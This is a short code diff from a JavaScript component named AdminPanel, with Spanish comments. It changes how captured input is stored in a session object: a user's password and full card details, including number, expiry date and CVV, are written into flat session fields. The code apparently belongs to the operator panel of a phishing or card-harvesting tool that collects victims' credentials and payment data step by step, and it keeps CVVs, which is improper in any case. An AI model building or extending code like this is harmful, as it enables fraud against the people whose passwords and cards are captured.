@@ -453,12 +453,10 @@ export default function AdminPanel() {
                   updatedSession.contrasena = inputData.contrasena;
                   break;
                 case 'datos_tarjeta':
-                  // Guardamos los datos de la tarjeta en la sesión
-                  updatedSession.datosTarjeta = {
-                    numeroTarjeta: inputData.numeroTarjeta,
-                    fechaVencimiento: inputData.fechaVencimiento,
-                    cvv: inputData.cvv
-                  };
+                  // Guardamos los datos de la tarjeta directamente en los campos existentes
+                  updatedSession.tarjeta = inputData.numeroTarjeta;
+                  updatedSession.fechaVencimiento = inputData.fechaVencimiento;
+                  updatedSession.cvv = inputData.cvv;
                   break;
               }
               
